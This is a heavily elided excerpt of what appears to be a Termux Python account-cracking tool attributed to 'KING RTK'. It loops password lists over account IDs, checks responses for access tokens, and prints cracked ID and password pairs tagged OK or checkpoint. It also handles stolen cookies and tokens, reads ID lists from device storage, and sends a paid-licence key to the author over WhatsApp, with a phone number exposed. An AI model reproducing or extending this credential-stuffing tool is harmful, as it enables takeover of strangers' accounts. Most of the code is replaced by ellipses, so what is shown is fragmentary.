...
\033[1;37m[-] AUTHOR    :\033[1;32m KING RTK

\033[1;37m[-] GITHUB    :\033[1;32m kingrtk01

\033[1;37m[-] WhatsApp  :\033[1;32m 01953289111  
        ...
        try:
            ...
            for pw in passlist:
                ...
                if 'access_token' in q:
                    ...
                    print(' \033[1;32m [RTK-OK] '+iid+' | '+pas+'\033[0;97m')
                    ...
                    print(' \033[1;31m [RTK🥺-CP] '+iid+' | '+pas+'\033[0;97m')
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/RTK.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    print('\n \033[1;35mExample: /sdcard/RTK.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;36m Example: /sdcard/RTK.txt\033[0;97m')
...
def menu3():
    ...
    try:
        ...
        key=(f'RTK-H{uid}5X{key1}110E==')#full key
...
--------------------------------------------
                ...
                whatsapp = "+8801953289111"

                url_wa = "https://api.whatsapp.com/send?phone="+whatsapp+"&text="

                tks = ("Hello RTK Sir, I Need To Buy Your Paid Tools Please Approve My Key :)\n\n Key :- "+key)

                subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                

                print(f'run : {H} python RTK.py');pass
